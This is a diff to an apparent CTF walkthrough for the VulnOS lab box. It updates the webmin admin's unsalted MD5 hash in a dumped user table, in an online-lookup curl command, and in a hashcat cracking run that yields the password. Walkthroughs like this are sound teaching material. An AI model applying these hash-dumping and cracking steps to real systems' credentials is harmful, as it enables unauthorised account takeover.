@@ -450,7 +450,7 @@ Table: odm_user
 +----+------------------+----------------------------------+--------------------------+-----------+
 | id | username         | password                         | Email                    | can_admin |
 +----+------------------+----------------------------------+--------------------------+-----------+
-| 1  | webmin           | 48ce3c1b1a1c22b2e3c4b6b0a5f5e3a1 | webmin@vulnos.local      | 1         |
+| 1  | webmin           | b78aae356709f8c31118ea613980954b | webmin@vulnos.local      | 1         |
 | 2  | guest            | 084e0343a0486ff05530df6c705c8bb4 | guest@vulnos.local       | 0         |
 +----+------------------+----------------------------------+--------------------------+-----------+
 ```
@@ -459,7 +459,7 @@ Table: odm_user
 > - `guest` → hash `084e0343a0486ff05530df6c705c8bb4`, which is the **MD5 of
 >   `guest`** — exactly the demo credential the login page advertised. This confirms
 >   the hashes are unsalted **MD5**.
-> - `webmin` → hash `48ce3c1b1a1c22b2e3c4b6b0a5f5e3a1`. `can_admin = 1` → this is the
+> - `webmin` → hash `b78aae356709f8c31118ea613980954b`. `can_admin = 1` → this is the
 >   **administrator**. This is our target.
 >
 > **Why unsalted MD5 is a non-password.** MD5 runs at **billions of guesses per
@@ -473,7 +473,7 @@ Table: odm_user
 **Fastest route — an online hash lookup** (only ever appropriate for CTF/lab hashes):
 
 ```bash
-curl -s "https://md5decrypt.net/Api/api.php?hash=48ce3c1b1a1c22b2e3c4b6b0a5f5e3a1" 
+curl -s "https://md5decrypt.net/Api/api.php?hash=b78aae356709f8c31118ea613980954b" 
 ```
 
 Result reported across the published walkthroughs for this box:
@@ -485,12 +485,12 @@ webmin1980
 **Proper offline route — hashcat** (learn this one; it is the professional tool):
 
 ```bash
-echo '48ce3c1b1a1c22b2e3c4b6b0a5f5e3a1' > webmin.hash
+echo 'b78aae356709f8c31118ea613980954b' > webmin.hash
 hashcat -m 0 -a 0 webmin.hash /usr/share/wordlists/rockyou.txt --show
 ```
 
 ```text
-48ce3c1b1a1c22b2e3c4b6b0a5f5e3a1:webmin1980
+b78aae356709f8c31118ea613980954b:webmin1980
 ```
 
 > **hashcat flags:**
